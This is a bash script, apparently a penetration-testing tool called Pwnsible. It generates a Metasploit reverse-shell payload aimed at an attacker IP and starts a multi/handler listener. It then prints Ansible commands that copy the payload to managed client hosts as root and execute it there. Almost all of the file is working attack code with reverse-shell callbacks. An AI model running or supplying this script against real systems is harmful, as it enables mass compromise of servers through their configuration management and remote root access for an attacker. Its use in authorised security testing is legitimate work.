#!/bin/bash
#!/bin/bash

#   Useful MSF Commands:
#	msfvenom --list payloads
#	msfvenom --list encoders
#	msfvenom --help-formats
#
#   You will need metasploit framework installed obviously

echo "+-------------------------------------------------------------------------+"
echo "|				      Pwnsible					|"
echo "|      The payload generator to pwn a ansible infrastructure using msf	|"
echo "|http://n0tty.github.io/2017/06/11/Enterprise-Offense-IT-Operations-Part-1|"
echo "+-------------------------------------------------------------------------+"
echo "|	  		      Author: Tanoy 'n0tty' Bose			|"
echo "+-------------------------------------------------------------------------+"
echo ""

function helpUsage {
echo "Usage: ./pwnsible.sh <metasploit payload> <type of binary> <attacker ip> <attacker port> <output directory>"
echo "Example: ./pwnsible.sh linux/x86/meterpreter_reverse_http elf 192.168.56.1 80 ansiblePwner"
}

function createPayload {
mkdir -p ${5}/
msfvenom -p ${1} -f ${2} lhost=${3} lport=${4} > ${5}/payload.file
}

function msfResourceScriptCreator {
echo "Creating metasploit resource script"
touch /tmp/pwnsible.rc
echo use exploit/multi/handler >> /tmp/pwnsible.rc
echo set PAYLOAD ${1} >> /tmp/pwnsible.rc
echo set LHOST 0.0.0.0 >> /tmp/pwnsible.rc
echo set LPORT ${2} >> /tmp/pwnsible.rc
echo set ExitOnSession false >> /tmp/pwnsible.rc
echo exploit -j -z >> /tmp/pwnsible.rc
touch /tmp/msfansible.sh
echo "#!/bin/bash" >> /tmp/msfansible.sh
echo "service postgresql start" >> /tmp/msfansible.sh
echo "msfconsole -r /tmp/pwnsible.rc" >> /tmp/msfansible.sh
chmod +x /tmp/msfansible.sh
echo "Launching Metasploit session"
gnome-terminal -e "bash -c \"/tmp/msfansible.sh; exec bash\""
}

function finalInstructions {
echo "Read http://n0tty.github.io/Enterprise-Offense-Ansible-Pwnage before running this script on your client environment"
echo "Instructions:"
echo "The payload has been generated. Now you need to copy the payload file to /etc/ansible/ directory in the ansible server and then run the following commands: "
echo "ansible <ansibleclient> -m copy -a \"src=/etc/ansible/payload.file  dest=/tmp/\" -u root"
echo "ansible <ansibleclient> -m shell -a \"chmod +x /tmp/payload.file\" -u root"
echo "ansible <ansibleclient> -m shell -a \"/tmp/payload.file\""
echo ""
echo "to cleanup just delete /tmp/payload.file from the target <ansibleclient>"
sleep 20
echo "Initiating local cleanup..."
rm /tmp/msfansible.sh
rm /tmp/pwnsible.rc
echo "Local system cleanup complete"
echo "Remember to delete folder "${1}" from your local system, once your activity has been completed"

}

if [ -z ${1} ] & [ -z ${2} ] & [ -z ${3} ] & [ -z ${4} ] & [ -z ${5} ];
then
	helpUsage
else
	createPayload ${1} ${2} ${3} ${4} ${5}
	msfResourceScriptCreator ${1} ${4}
	finalInstructions ${5}
fi
